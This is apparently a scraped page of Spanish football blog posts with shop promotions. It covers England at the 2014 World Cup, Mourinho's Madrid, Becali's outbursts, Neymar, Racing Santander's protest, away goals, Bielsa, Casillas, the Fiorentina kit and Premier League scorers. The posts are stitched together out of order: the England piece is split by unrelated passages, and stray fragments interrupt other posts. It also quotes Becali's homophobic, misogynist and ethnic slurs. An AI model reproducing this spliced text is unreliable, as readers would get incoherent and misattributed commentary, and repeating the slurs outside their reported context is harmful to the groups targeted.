online especializada en camisetas de fútbol de todo el mundo. Un aura de pesadumbre sobrevuela Inglaterra cada vez que se acerca un Mundial. Hay tanto por hacer y tan poca esperanza de poder hacerlo… Quizá desde la experiencia del 94 sea ya suficiente éxito el mero hecho de clasificarse para la fase final, algo que casi debería darse por hecho por el simple peso de su nombre y su historia, pero el caso es que los cuarentones ingleses no tienen más recurso a su alcance que celebrar un par de buenos torneos, pero ninguna final. Anoche, mientras Rio Ferdinand comentaba el partido ante Italia para la BBC, un rótulo a los pies del central de Lewisham resumía la desdicha inglesa acumulada pacientemente, cuatrienio tras cuatrienio, desde el 66: ‘Quarter-finalist in Japan/Korea’02 and Germany’06‘. Rememorando lo olvidable, destacando lo indestacable.Pero ese Rumble in the jungle disputado el sábado bajo la humedad insoportable de Manaos dejó para el recuerdo el retazo de una Inglaterra distinta. Una Inglaterra alejada de ese equipo nostálgico y anclado en la calva brillante de Bobby Charlton, mirando por fin hacia el futuro y no hacia el pasado. El reseteo era necesario, pero entre Platts, Beckhams, Lampards y Rooneys, a alguien le había dado miedo apretar el botoncito, no fuera a ser que entre toda la pléyade de supuestos rescatadores se escapase el Mesías sin hacer su trabajo.Los hay maquiavélicos y los hay kavafianos, los hay que sólo miran el resultado y los hay que disfrutan del itinerario para conseguirlos. Yo soy de los primeros pero puedo disfrutar como lo hacen los segundos. Hablando claro: lo del Barça haría estremecerse al poeta griego y lo de Mourinho levantaría del sillón al pensador florentino.El equipo, volviendo al fútbol, funciona. Y lo hace básicamente por el mantenimiento del bloque del año pasado, un proyecto larvario, con más sombra que luz, pero punto de partida para entender la eficacia de estos meses. Si entendemos este deporte como la conjunción de cuatro líneas –portero, defensa, centro del campo y delantera- el equipo de Mourinho es ejemplar. Sus equipos, desde aquel Oporto al Inter campeón de Europa, tienden a la mezcla de posiciones como garantía de una defensa solidaria y un ataque sorpresivo. Los jugadores pivote pierden peso frente a los todocampistas –memorable Lampard, impactante el Eto´o carrilero o el Coentrao inclasificable en estos primeros partidos-, donde el todo es superior a la suma de las partes, que digo poniéndome gestáltico. El otro modelo, el del brillante Barcelona de Guardiola, tiene una visión más estática del fútbol. Lo que corre es el balón, como diría el filósofo holandés, y los jugadores mantienen la posición con disciplina soviética mientras que el contrario corre detrás de la odiosa esfera de cuero. El Madrid apuesta por la estampida, el desborde y el cuerpo a cuerpo. Su fútbol es más farragoso y menos estético pero igualmente eficaz. En esta temporada hemos visto un Madrid intratable en ese treinta por ciento de campo que no es de nadie, esa zona neutral que es el centro del terreno de juego, allí donde arrancan por igual los contraataques y las defensas. La figura de Xabi Alonso se ha agrandado rodeado de jugadores eléctricos, maleables, asociativos y es, de alguna manera, el único elemento estático. Como el eje en torno al cual revolucionan los compañeros, la referencia para ese caos ordenado que plantea el técnico portugués.Cuando el viento va de cara las cosas funcionan solas. Kaká, por ejemplo, ha pasado de ser poco más que un bulto sospechoso en el banquillo del Bernabéu a ejercer el rol de jugador exquisito que en su día lo llevó al estrellato. Como diría Rodax “ni antes era tan bueno ni ahora soy tan malo”, pero su mejora es una buena noticia para los blancos. El centro de la defensa funciona y da garantías con Pepe, ese brillante desequilibrado que para mí se ha convertido en el mejor central que ha tenido el equipo de Chamartín desde que Hierro colgó las botas, y la que unánimemente se defiende como la mejor posición para Ramos. Y con dos laterales, Arbeloa y Marcelo, que están sacando petróleo de unas bandas demasiado acostumbradas al pasillo corto. Lo de Alonso, como decía, es sobresaliente, y mucha culpa la tiene su conexión con Coentrao, Di María u Özil. El caso del alemán, por cierto, es el más alarmante en lo que va de temporada. Ha ido perdiendo peso en el equipo, el año pasado con un equipo más bisoño logró destacar precisamente por alumbrar el desorden ofensivo de una plantilla con tendencia al descontrol. Este año, con el equipo mejor plantado, su rol debería ser el de canalizar y ocupar más espacio del que ocupa. En mi opinión es un jugador blando, poco acostumbrado al rifirrafe en la zona templada, como un artista de cristal con la fuerza justa para poner el balón en el sitio justo. Nada que ver con el centrocampista que gusta a Mourinho, un perfil como Di Maria –más impreciso pero más correoso y valiente- o Callejón –con mucho menos fútbol pero más sacrificado y luchador que el ex del Werder-. Entrará en juego seguro, pero si Sahin termina con entrar en el once y apuntalar el medio del campo junto a Alonso, el perfil de boya ofensiva de Özil debería perder fuerza a favor de jugadores con más desborde y vocación de banda.Arriba la competencia entre Benzema e Higuaín está haciendo crecer a ambos. Soy muy escéptico en cuanto al argentino. Yo, podéis abuchearme, lo hubiera vendido en verano. Creo que había jugadores con más calidad que él en el mercado. Siempre que veo al Kun pienso en lo bien que le hubiera quedado el blanco. Como escribí una vez por aquí, el Pipita me parece un delantero destemplado. Marca goles, sí, pero le cuesta fabricarlos. El equipo trabaja para él y un equipo grande necesita más soluciones que exigencias.Estrella humanista en definitiva, Gigi Becali es un personaje imprescindible del fútbol europeo. Lo es por cosas como estas. Lean.Esta misma semana si ir más lejos, Hills recoge una conversación imprescindible entre Marian Iancu, mandamás en la Politécnica de Timisoara y Gigi Becali. A Iancu, al que apodan “El elefante” por su inconfundiblemente rolliza estampa, la acaban de condenar a diez años de prisión por diversas travesuras fiscales y rápidamente ha recibido el consejo sabio de Becali. “¿Por qué te arriesgas a 10 años, idiota? . Tienes dinero y la cárcel es degradante. Vete a Australia, a África o a Miami. Con dinero nunca te pillan”Las peroratas de Gigi el Amoroso son legendarias. El verano pasado se sinceró con la prensa local y tuvo para los entrenadores: “¿Realmente creen que él no sabe lo que va a pasar si perdemos? Qué Dios le ayude. Comenzará la Jihad”; para sus compañeros de gremio: “Dinu Gheorghe (presidente del Rapid) es un idiota, un sucio pordiosero y un gordo. Estoy harto de ese gitano” y hasta para los homosexuales “Es su enfermedad, no la mía”. Al terminar confesó que la eyaculación verbal le había hecho renacer. “Esto volverá loco a Satanás. Odia ver como un alma se limpia”Becali ha confesado en más de una ocasión sentirse en conexión con Cristo, quizá eso explica su querencia por hablarle clarito al rebaño. Así se dirigió no hace mucho a sus propios aficionados “Siento si les he ofendido. Menos a los que desearon mi muerte justo antes de Semana Santa. Esos están poseídos por Satanás” Claro que Becali maneja con idéntica pericia las distancias cortas “Un hombre puede escoger. Como dijo Dios, un hombre es un hombre y una mujer es una puta” fueron las palabras de Gigi, consejero matrimonial, para con su amigo, el presidente del FC Dinamo Cristian Borcea, cuando este decidió divorciarse de su santa. ¿Gigi inimitable? Pudiera parecer pero desafortunadamente su familia esparció simiente por toda Rumanía. Así se pronunció su primo Giovani Becali, uno más en esa legión de tratantes que pueblan la familia de agentes FIFA, cuando le acusaron de sobornar al ex-seleccionador nacional Razvan Lucescu. “Nunca soborno a hombres, ni siquiera los guapos. No es lo mío. Si Lucescu habla de sobornos es porque quiere uno” De casta le viene al galgo. Puritita exhibición genética que Darwin estaría encantado de contemplar.Y de postre, para coronar este festín de miserias, una frase que el primo Giovani aprendió con total seguridad en cualquier cena familiar y que resume el estilo Becali. “Estoy limpio pero me encanta ser malo. Me gusta cuando las personas me tienen miedo” La conversación sobre fútbol siempre es cuestión de modas. Ahora se les presta mucha atención a los fanáticos de la anécdota estadística pero esa ola pasará, estoy seguro, dejándonos una espumilla ligera de números y el eco de un gruñido robótico a lo lejos. Cosa distinta son los agoreros. Los que desconfían de los futbolistas con clase pero livianos siempre serán legión y tienen en la cantera sudamericana el alimento perfecto e inagotable para seguir desbarrando durante siglos. No entienden que si a los grandes jugadores se les pudiera detener solo a base de hostias Escocia tendría cinco mundiales.Ese tropel de sabios que ahora goza de altavoz en unas cuantas tertulias deportivas de derribo zumbará majaderías sobre sistemas y adaptaciones por los siglos de los siglos. No se callarán pero la buena noticia es que existen tipos como Neymar, para recordarles de vez en cuando que los prejuicios por cuestiones de pasaporte no dejan de ser precisamente eso, majaderías. Queda el talento.Neymar es un futbolista delicioso. Los hay más fuertes, por supuesto; pero muy pocos tienen tanta delicadeza para llevar la pelota. A mi me provoca la misma admiración que sentía viendo botar el balón de baloncesto a los yugoslavos cuando plavi era un término que asociábamos a la mitología. Petrovic, Kukoc y Neymar. El balón de aquí para allá y el juego natural, alegre y dominador. Nunca hay que desconfiar de un tipo al que le brillan las botas en lugar de los pectorales.El brasileño fue el mejor anoche sin la ayuda de Messi, desoyendo a los archiveros que anticipaban un partido durísimo ante el Celtic por alguna extraña razón acumulativa y a los cenizos del balón. Recibió todas las patadas que anticiparon estos últimos antes de su fichaje y alguna más. De todas salió fortalecido con calidad y huevos. Fue ante un Celtic disminuido y en la rutinaria fase de grupos de la Champions pero Neymar sigue jugando en Europa tan bien como en Brasil incluso cuando el equipo no acompaña. Y esa es la única estadística que cuenta. Lo pensé cuando tenía doce años con el póster de Queen sobre la cabeza y lo pienso ahora, la pista doce del directo en Wembley mola indudablemente. Suena y es pajero pero Brian May envuelto en el solo de guitarra de Brighton Rock me parecía imparable. Lo recordé hoy echando un ojo a las breves de la BBC y enterándome de que Gustavo Poyet va a ganar la liga y plantarse en Segunda pero planea hacerlo con cien puntos en la mochila. 100 señores puntos.Podéis seguir abucheándome. Benzema es otra cosa. Empezó mal, incuestionable, pero es un delantero total. La comparación con Ronaldo, el de toda la vida, no es gratuito. Ambos son jugadores autárquicos, independientes, que viven ajenos al desarrollo del juego, infranqueables, que no olvidan su cometido en los noventa minutos: marcar. Además el francés se ha destapado como un buen asistente, un complemento más de su completo perfil atacante. Por otra parte lo de Cristiano Ronaldo sigue siendo monumental. Crea peligro constantemente, no se obceca como antes, despeja el juego ofensivo, juega a banda y al interior, remata cuando debe rematar y baja a defender cuando tiene que hacerlo. Crea juego, lo destruye, no pierde la portería de vista pero tampoco a sus compañeros. Un jugador que, de no ser por la existencia de ese astro llamado Messi, sería el rey absoluto de este deporte universal.Queda mucha Liga, muchísima Copa y una Champions aún insondable. Pero el Madrid tiene equipo para pelear por las tres. El Barcelona no anda fino, su palidez resalta el buen color del equipo de Mourinho. Todo son rachas. Los de Guardiola andan cortos de efectivos y se nota, pronto crecerán en cuanto las lesiones dejen de hacer mella en su lustrosa plantilla. Será entonces cuando se podrá medir el potencial de ambos.En la tarde de Manaos aparecieron en escena Raheem Sterling y Daniel Sturridge, dos estiletes descarados y hambrientos, y la puesta a cero se materializó de manera natural.Inglaterra tiene motivos para mirar con optimismo a lo que esté por llegar en un futuro inmediato. El equipo dispuesto por Roy Hodgson sobre el ralo césped amazónico -qué incongruencia, ¿verdad? - ya no languidece asustado bajo la sombra del 66. En lugar de un hundir sus raíces en suelo yermo, prefiere abonar y alimentar la base sobre la que levantar un futuro esperanzador. Pocas veces el peso de un pasado que honrar resultó tan indigesto y tan complicado de sobrellevar como en el caso inglés. El sábado por la noche Inglaterra consiguió por fin arrancar el motor de ese viejo Jaguar que acumulaba polvo y podredumbre en el fondo de un garaje oscuro desde hacía cincuenta años. Habrá que pasarlo por el túnel de lavado, repasar chapa y pintura, arreglar algún que otro cromado y el tapizado de los asientos… pero esos seis cilindros siguen rugiendo que es una delicia escucharlos. Y, bueno… ya llueve un poco menos sobre las colinas de Yorkshire. Yo no sé si es el desapego emocional, el escaso interés que me despierta (propiciado, entiendo, por el paupérrimo nivel y la escasa competitividad ofrecidos regularmente sobre el césped) o la vorágine informativa en la que se convierten los equipos del tramo final de la tabla en este último tercio del campeonato, pero confieso que llega un punto en el que me cuesta seguir la actualidad de aquellos equipos que pelean por evitar el descenso. Que te sorprendes cuando descubres que Lucas Alcaraz se sienta en el banquillo del Levante y que Djukic ya no lo hace en el del Córdoba desde hace semanas. Es un clásico de estas alturas de campaña, potenciado en los últimos tiempos por las enormes diferencias existentes entre la mitad noble de la clasificación y la mitad menos pudiente y por unas plantillas, sometidas a profunda y obligada renovación cada verano y el consecuente apuntalamiento en el mercado invernal, que muy a duras penas dan el nivel mínimo exigido para competir con ciertas garantías en la máxima categoría.El último en dar el volantazo ha sido el Almería, tras la destitución de Juan Ignacio Martínez que siguió a la dolorosa derrota (1-4) ante el Levante del pasado fin de semana. Y no es el primer cambio brusco de dirección en el club almeriense. JIM ya reemplazó a Francisco allá por el mes de diciembre. Una nueva propuesta, un nuevo director de orquesta, una nueva relación en el vestuario. Con todo lo que ello implica. Y todo, en el convencimiento de la conveniencia de cambiar de moto en mitad de la carrera. Porque vamos a pensar que no todo responde a una maniobra a la desesperada. Vamos a suponer que no es la vieja estrategia final de aporrear todos los botones del joystick sin lógica ninguna en confianza de que, en un guiño de la fortuna, nos salga el combo magistral que nos saque del atolladero de manera brillante.En el Estadio de los Juegos del Mediterráneo pretenden que lo que no funcionó ni con Francisco, técnico que ya les salvase la pasada temporada, ni recientemente con JIM, lo haga ahora con Sergi Barjuan. Y si la Liga constase de ochenta jornadas y el equipo continuara sin encadenar las victorias de manera holgada, seguirían probando fortuna con uno y otro técnico. Despreciando la estabilidad y apostando ciegamente por la inmediatez, por continuar cabalgando en la cresta de la ola al precio que sea. Y lo peor de todo es que hablamos del Almería como podíamos haber hablado de otros seis o siete equipos más. Anoche, durante al menos un par de horas, toda España posó su vista sobre la preciosa ciudad de Santander. Un equipo de fútbol decidió que su nivel de tolerancia a la burla y al saqueo había llegado hasta sus límites más altos. Con el vaso a punto de desbordarse, el Real Racing Club de Santander, el histórico y centenario club de la capital cántabra, decidió que ya estaba bien. Que hasta ahí había llegado su paciencia y su comprensión con los Pernías, Harrys, Syeds, Montalvos y demás caterva de impresentables que mantienen a la entidad santanderina secuestrada y bajo el yugo de sus perpetuos mamoneos. Los once jugadores que el técnico Paco Fernández decidió disponer sobre el césped de El Sardinero para jugar la vuelta de los cuartos de final de la Copa del Rey ante la Real Sociedad se plantaron en el círculo central. Se quedaron impasibles. Abrazados para sentirse fuertes. Con la cabeza erguida y el pecho henchido. Habían aguantado tantas bofetadas, tantos desplantes y tantos vaciles por parte de aquellos que decían ser sus jefes que se veían capaces de navegar en mitad de la más fiera tempestad. Fueron Mario, Francis, Javi Barrio, Saúl, Orfila, Andreu, Ayina, Javi Soria, Granero, Miguélez y Rubén Durán. Once que representaban a todos sus compañeros, a todo el racinguismo, a toda Cantabria. Once valientes que se olvidaron de la ilusión de poder disputar un partido que probablemente no podrán repetir en sus carreras deportivas y que decidieron enfrentarse al poder instituido con su orgullo y su dignidad por únicas armas.La imagen es la de once futbolistas revelándose contra unos dirigentes de paja que mantienen secuestrada una ilusión centenaria. Pero, más allá de eso, la plantilla del Racing personificó con su acto de anoche el sentir generalizado de todo un país. El cansancio y la profunda decepción con el orden establecido, con la muy mediocre clase política, con la manera en la que está montado este tinglado de mierda que mantiene a buena parte de la población española con el agua al cuello y suplicando por un madero al que poder aferrarse. Anoche comenté en Twitter que el fútbol español le debe una (y muy grande) a la plantilla del Racing. Me quedé corto. El pueblo español le debe una a esos tíos.Por ese ejemplo de dignidad y de valentía. Quizá después de todo esa gentuza termine asesinando al Real Racing Club. Con lo que jamás podrán acabar ya, por más fuerte que se lo propongan, será con el sentimiento de toda una afición y de toda una ciudad. El Racing, después de la inolvidable gesta de ayer, vivirá para siempre y pase lo que pase con él en la memoria de todos. Arsenal y Chelsea han sido eliminados gracias a la regla del valor doble de los goles en campo contrario. . Creo que es una norma que debería ser cuestionada porque está desfasada y debería cambiarse. Llevo peleando por ello desde hace tiempo.Alguno podría interpretar las palabras de Arsène Wenger, en el día de la resaca de su eliminación en octavos de final de la Champions League, como una reacción enrabietada ante un fin de viaje anticipado e inesperado. Los tres goles logrados por el Monaco en Londres hicieron valer la cada vez más polémica y discutida normativa del valor doble, en caso de empate, de los goles conseguidos en campo contrario, de la que, bien es cierto, el técnico francés ha renegado en varias ocasiones ya anteriormente.Argumenta Wenger que la norma, que nació en la década de los sesenta como maniobra para premiar la valentía de los equipos visitantes e incentivar los viajes de la afición a otros estadios, al evitar que estos acabasen encerrados en torno a su área especulando con la hipotética ventaja de su localía, ha quedado obsoleta y ha terminado desvirtuando su espíritu para convertirse, precisamente, en todo lo contrario de lo que en sus inicios buscaba. Porque el valor doble de los goles en campo contrario ha acabado provocando que los equipos que juegan como locales se comporten de manera más conservadora, protegiendo su portería ante la amenaza de un gol visitante. Es decir, por tratar de potenciar la tendencia atacante de unos, se acabó menoscabando la de los otros, en perfecta extrapolación de la teoría del yin y el yang.Los tiempos han cambiado en los últimos cincuenta años. A partir de ciertos niveles, los grandes equipos juegan del mismo modo fuera de su estadio que en su propia casa (¿o hizo algo diferente a lo habitual el Barça hace dos semanas en el Etihad? ¿y el Madrid en Gelsenkirchen?) y tratar de incentivar su fútbol ofensivo a costa de amedrentar al equipo local ante la posibilidad de encajar goles en su campo ha terminado degenerando, en ocasiones, en un fútbol más especulativo y timorato. Tal vez la norma debería ser revisada y adaptada. Quizá modificada, y ceñir el valor doble de esos goles en campo contrario solo en el caso de que fuesen anotados durante la prórroga. Y no porque el Arsenal haya vuelto a caer mucho antes de lo previsto. Pocas cosas ocurren de manera normal cuando Marcelo Bielsa (Rosario, Argentina, 1955) anda por medio. El ya extécnico del Olympique de Marsella sorprendió a todos (o quizá no tanto) cuando, el pasado sábado tras caer derrotado ante el Caen en el Vélodrome (0-1), anunció su renuncia a su cargo de manera irrevocable. Cierto es que el ambiente en los últimos tiempos parecía haberse enturbiado un poco, muy particularmente ante el supuesto interés de la federación mexicana por hacerse con los servicios del rosarino, pero nada hacía presagiar que el caso acabase desembocando en una dimisión tan abrupta y extemporánea.Todo parece venir, en palabras del propio técnico, de una desavenencia irremediable surgida a raíz de la intención del club presidido por Vincent Labrune de modificar unilateralmente el contrato que unía al argentino con la entidad marsellesa. Pero, ¿qué fue lo que realmente ocurrió? La normativa de la competición francesa obliga a clubes y técnicos a vincularse contractualmente por un mínimo de dos temporadas, algo que choca frontalmente con la idea de trabajo de Bielsa, quien acostumbra a firmar contratos de año en año (así lo hizo en sus dos campañas en Bilbao). Sea como fuere, la maquinaria jurídica del OM consiguió burlar la imposición normativa. Bielsa firmó por un primer año, el pasado, y se encontraba a la espera de formalizar a través de su rúbrica su segunda campaña al frente del banquillo del Vélodrome. Todo debía de haber sucedido la pasada semana. Sin embargo, aquellas condiciones que técnico y club habían pactado previamente de manera verbal habrían sido modificadas por los servicios jurídicos del OM sin contar con la aprobación de Marcelo. Y aquello, para un hombre que basa su respuesta ante las exigencias diarias de su puesto de trabajo en una confianza ciega en sus superiores y para el que la palabra es absolutamente sagrada, fue el detonante de la inesperada decisión conocida el pasado sábado. Mucho se ha hablado de la integridad moral de Marcelo Bielsa. De la rectitud extrema y enfermiza con la que desempeña su trabajo y de una honradez atípica en el mundo del fútbol. Por eso se entiende que alguien decidiese llamarle ‘Loco’. Por su empeño en ir contracorriente y en mostrarse radicalmente diferente a lo habitual en un ambiente, el del fútbol, en el que las inestables relaciones profesionales aparecen completamente prostituidas y viciadas por un maremágnum irreconciliable de intereses personales. Para alguien para el que la palabra dada es ley faltar a la misma es quebrar los principios básicos de las relaciones profesionales. Con sesenta años, parece imposible que algo en Bielsa vaya a cambiar. Quien lo contrata sabe a lo que se expone, para lo bueno y para lo malo. Sus sonadas aventuras en los banquillos de los clubes que ha dirigido, muy condicionadas por el lógico desgaste del día a día, son profusas en desencuentros con sus superiores y en situaciones de tensión. Lo que para uno eran intolerables intromisiones en su trabajo, para otros eran situaciones en las que el técnico anteponía su persona a los supuestos intereses del club. Como si sus intereses personales fueran diferentes de los del club que dirige. Piensa el ladrón que todos son de su condición.Y todo ello en un sistema con los roles tan ceñidos a los cargos como es el del fútbol. El que preside, preside y tiene el pleno poder ejecutivo. El que se encarga de la parcela de la dirección técnica entrena, dirige partidos, vocifera desde el banquillo cuando es menester (y a veces, incluso, cuando no lo es) y da explicaciones sobre el desenlace de los encuentros. Tal vez por eso se haga complicado trabajar con Marcelo Bielsa. Porque en su incansable afán de perfeccionamiento asume como tarea suya el control sobre todos los flecos que rodean la actividad del club (así ocurrió en Bilbao, con las ya famosas obras de Lezama) y es entonces cuando choca frontalmente con la rigidez del establishment futbolístico. Bielsa es como el padre sobreprotector que no deja que su hijo se equivoque y que antes de que éste meta la pata ya está evitando su error. Su actitud sobreintervencionista tiene poco recorrido porque tiende a destapar las innumerables carencias en el ámbito de la gestión deportiva integral de la mayoría de los directivos que han pasado por la compleja experiencia de convivir con la personalidad del argentino.Quizá a Marcelo pueda hoy reprochársele la extemporaneidad de su decisión. Poner fin a su trayectoria en Marsella con solo una jornada liguera disputada no deja al club en la mejor de las disposiciones de cara al futuro más inmediato. Pero quien trabaja con Bielsa sabe lo que se trae entre manos. Sabe que hay ciertas barreras que nunca debe sobrepasar. Sabe que cada aproximadamente doscientos kilómetros le espera un peaje en forma de conflicto interno con el técnico que deberá saber manejar con generosa dosis de mano izquierda. Es el precio a pagar por una relación tan intensa, todo a cambio de un trabajo honesto y minucioso. Y, sobre todo, de un legado inolvidable. No creo arriesgar demasiado si empiezo afirmando que Iker Casillas dejó de existir cuando el repertorio de milagros comenzó a disminuir en intensidad y, sobre todo, en periodicidad. No es que llegado a cierta edad Casillas empezara a fallar más de lo normal, es que cuando se agotaron las intervenciones sobrehumanas, Iker se convirtió en uno más bajo los palos. Un portero notable, con un fuerte carisma labrado durante años y con una hoja de puntos débiles que, en ausencia de sus repetidas actuaciones milagrosas, lo hacían asquerosamente humano.Su carrera hasta la cúspide se fue edificando sobre un aura de mito viviente. Porque nadie en el mundo parecía capacitado para obrar los milagros como el mostoleño, con tal soltura, espontaneidad y naturalidad. Su categoría se construye sobre el retrato de Perotti, el de Robben y el de Berbatov en Glasgow. Vuelos antinaturales, reflejos sobrehumanos. Y todo ello, sin perder nunca la cercanía carismática y la sencillez. Iker supo bien cómo gestionar su estatus de deidad en la tierra. O eso parecía. Porque debió de suponer un ímprobo esfuerzo mantener los pies sobre el césped cuando el sentir popular y la batería mediática veían a Casillas como se suele ver a las apariciones marianas: flotando de manera etérea y hablando extrañas lenguas muertas.Sin embargo, pese a la aparente y bien trabajada naturalidad, pese a su afable cercanía cotidiana, algo de todo aquel tratamiento de deidad debió de calar en el subconsciente del portero. Por no saber descender de los altares deportivos sobre los que cierto sector de la prensa se empeñaba enconadamente en mantenerlo aupado. Tal vez por dejarse ir, por no admitir que el talento innato también necesita ser reciclado y cultivado con mimo y por no tratar de hacer más suave la caída apoyando sus innegables condiciones naturales con una buena dosis de trabajo diario. El cerebro seguía enviando las órdenes correctas, pero la castigada musculatura ralentizaba su ejecución hasta convertirlas en ridículamente inoperantes. De algún modo, Casillas terminó creyéndose aquello de ‘el Santo’. Debió de creer que lo connatural superaba a lo aprendido y que su capacidad extrasensorial para hacer posible lo imposible sería más poderosa que el inexorable y cruel paso del tiempo. Cuando se quiso dar cuenta de su error, se encontró de frente con buena parte del madridismo. De su querido madridismo.Porque nada justificará jamás el trato degradante y cainita sufrido por Iker Casillas en los dos últimos años de su carrera como futbolista del Real Madrid. Ni el más lastimoso de los rendimientos deportivos, aunque tampoco fuese el caso, concede autoridad a quienes decidieron colocar al portero en el cadalso a la vez que ejercían de brazo armado de uno de los contendientes en las cuitas de poder que afectan al seno del club. No se puede ser tan miserable con las personas. Y no es simplemente una cuestión deportiva. No es asunto de que un determinado futbolista no dé la talla o no aporte todo lo que de él se espera sobre el verde. Porque el capitán madridista se vio de pronto acorralado por el fuego cruzado. A medio camino entre una trinchera y otra. Y a nadie pareció importarle el respeto ganado durante tantos años. Enseguida fue estigmatizado por todos aquellos que prefieren vivir el fútbol desde la confrontación eterna y la batalla perpetua y que solo saben entender la defensa y enaltecimiento de un club desde el odio al ajeno. Se le acosó desde el escarnio y se le señaló como indigno capitán simplemente por entender este deporte de un modo diferente, por estrechar lazos de confraternización y compañerismo con los rivales, por enfrentarse a quienes se empeñaban en levantar empalizadas en torno a las fronteras del mejor club de la Historia. Por tratar, en definitiva, de ser mejor persona. Porque no se trata de fútbol. No se trata de ganar o perder. Se trata de saber comprender y perdonar. De ser buenas personas. De ser humanos. De tratar a los demás como a nosotros nos gustaría que nos tratasen. Puedes comprar camisetas de Iker Casillas (y ahora, además, con descuentos desde el 40%) en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Los cuarenta millones de seleccionadores nacionales que aguardábamos la decisión definitiva del seleccionador jefe sobre la lista de veintitrés futbolistas que representarán a España en la cita mundialista de Brasil recibimos nuestra esperada dosis de carnaza el pasado domingo. Vicente del Bosque enumeraba a los escogidos confirmando que es un hombre de tradiciones, de respeto máximo a las jerarquías y poco dado a giros de guión inesperados. Más o menos, lo que ya todos sabíamos.La lista española es el vivo ejemplo del continuismo que siempre ha guiado la carrera del técnico salmantino como principal responsable del combinado nacional. De los veintitrés jugadores finalmente seleccionados, dieciocho de ellos estuvieron hace un par de años en la Eurocopa de Polonia y Ucrania y dieciséis repiten con respecto al Mundial sudafricano de hace cuatro años. Llamativo resulta que de las ausencias en relación a aquellas citas, solo la de Álvaro Arbeloa y la de Fernando Llorente parecen responder a motivos estrictamente deportivos o de rendimiento reciente. El resto de las ausencias más notables responden a lesiones (Valdés, Navas) o a motivos de edad (Marchena, Puyol, Capdevila), causas forzosas que han terminado obligando a Del Bosque a permitir el paso a esa nueva generación encabezada por Azpilicueta, De Gea, Koke o Jordi Alba. El inexorable paso del tiempo, ley de vida.Preocupa quizá la ausencia de una alternativa al juego ya asimilado y normalizado por la selección del toque-toque-toque y búsqueda de la ruptura por el centro.Y veo al cromo legendario calculadora en mano, voceando en ese vestuario con olor a sal que tienen 83. Que, señores, nos quedan ocho ases en la manga, que eso son veinticuatro y necesitamos solo diecisiete. Que pueden escribir una bonita historia. El vestuario es el del Brighton, el vagabundo del fútbol inglés que un día reseñamos en este blog, y allí como el rizoso rasgando la guitarra en Wembley todos parecen imparables. De la mano de Classic Football Shirts , la tienda especializada en camisetas antiguas, nos acercamos al fútbol con una perspectiva diferente, desde los uniformes con los que se ha construído la historia del deporte rey.El primer camino para llegar al violeta de la Fiorentina se recorre regateando pompas de jabón, compuestos tensoactivos y tambores de lavadora. Dice la leyenda que lo pasear palmito en morado fue cosa de accidente doméstico. Que el viola es fruto de lavar juntas las casacas originales del club, que eran rojiblancas, junto a la ropa que usaba el equipo en los entrenamientos, de color azul. Los defensores de tan chiripitifláutica vía explican que el morado vino de combinar talas blancas, rojas y azules en imprudente colada, pero incluso con la ayuda del detergente más potente y milagroso que pudiéramos apañar de ese lavado tan solo podría salir, a lo sumo, un lila fuerte. La leyenda Micolor tiene difícil defensa…Para recorrer el segundo camino que acerca a la icónica camiseta morada tendremos que meternos en algún jardín. Y es que la violeta, cuya variedad blanca ya decoraba el primer escudo de armas de Florencia, alfombra los campos de media Toscana así que no es extraño que muchos le hayan encontrado explicación botánica al asunto de la extravagante y original camiseta florentina.Para caminar el tercer sendero tenemos que desplazarnos a Hungría. Y el viaje merece la pena porque este camino al viola es el más bonito. Una noche de 1929, Luigi Ridolfi a la sazón noble florentino y prohombre italiano, discutía acerca de que color convendría adoptar para la nueva camiseta con Károly Csapkay, entrenador en la prehistoria viola. Hartos de la predominancia del rojiblanco, el blanquinegro y otras variantes al uso, decidieron que la mejor idea era la que acaba de aportar Csapay: la camiseta debía ser morada para que destacase sobre el verde del césped. ¿Pero por qué precisamente morado sobre verde? Csapkay, que era hijo de Budapest y se había criado futbolísticamente en los equipos menores de la capital húngara, tenía una imagen poderosa y fija en su mente desde el ascenso del Ujpest a la élite del fútbol húngaro. Que el morado sobre verde molaba. Definitivamente el morado del Ujpest sobre el tradicional verde del Ferencvaros era una idea que revoloteaba en la mente del míster húngaro, Ridolfi se la compró y desde entonces la Fiorentina puede presumir en toda Italia de tener en el armario un traje único.Teorías plausibles o mágicas al margen lo cierto es que ochenta años después el morado se ha convertido en un color altamente identitario no solo para la Fiorentina sino para cada todos y cada uno de los habitantes de Florencia. Aparece en revistas, en la decoración de las casas, en los rótulos de los negocios y ha llegado a ocupar el lugar de los auténticos colores oficiales de la capital toscana, el rojo y el blanco.Puedes comprar estas camisetas y cientos más en Classic Football Shirts. Formar clubes selectos es algo que a los ingleses les pirra. Y mejor cuanto más extravagantes. “God save tudor houses, antique tables and billiards”, que decían los Kinks. Frank Lampard mismamente, ha sido de los últimos en ingresar en uno de los más refinados. Se presentó, abrieron para él su  puerta y les dejaron limpiar los tacos en su exclusivo felpudo. No fue en la Sociedad para Amantes de la Cerveza de Barril ni en la de Conservadores de la Cara de Hooligan, el centrocampista del Chelsea forma parte del escogido grupo de jugadores que han marcado 100 o más goles en la primera división inglesa desde que se inventara el lucrativo negocio que responde al nombre de Premier League. De hecho es el medio más goleador de la historia en la Premier y el único medio en el club de artilleros junto con Le Tissier, Scholes y Ryan Giggs. La cosa tiene mérito. Anotar más de 100 veces sin ser delantero es como para salir a quemar todos los bares de Londres y seguro que lo hizo en su momento. Festejemos nosotros  ahora repasando el listado de los 19 futbolistas que han depositado la pelotita en la malla más de 100 veces desde que la Premier es Premier. Alla va.1. Alan Shearer. 260 anotaciones para un favorito de cualquiera con un mínimo de gusto futbolístico. Estandarte del histórico Blackburn Rovers, del Newcastle United y de la selección, Shearer le zurraba con la misma fuerza a la pelota a 40 metros de distancia de la portería que en boca de gol. Y así hasta 283 si contabilizamos su etapa en el Southampton, cuando aun existía la Primera División. Mirarle de arriba a abajo y comprender que él fue el molde del que fabricaron el primer Action Man es todo uno.2. Andy Cole. 187 goles para el Newcastle United , Manchester United, Blackburn Rovers, Fulham, Manchester City, Portsmouth y Sunderland. Un trotamundos con un comienzo de carrera espectacular y que  además supo coincidir con el glorioso retorno del United. Una vez cansado de dar patadas a la pelotita, se retiró y tuvo a bien dar unas cuantas a la música. Rapeaba con gracia de un blanco y aun así la escaramuza entró en el top 100 de singles UK en su momento. El marketing.3. Thierry Henry.Antes de ir a hacer la goma a Barcelona y de la jubilación americana nos maravilló a todos en el Arsenal embocando en 174 ocasiones. Ninguna extravancia tipo Dennis Bergkamp o Kanu pero golazos la mayoría. El mejor jugador de la historia del Arsenal.4. Robbie Fowler. Un 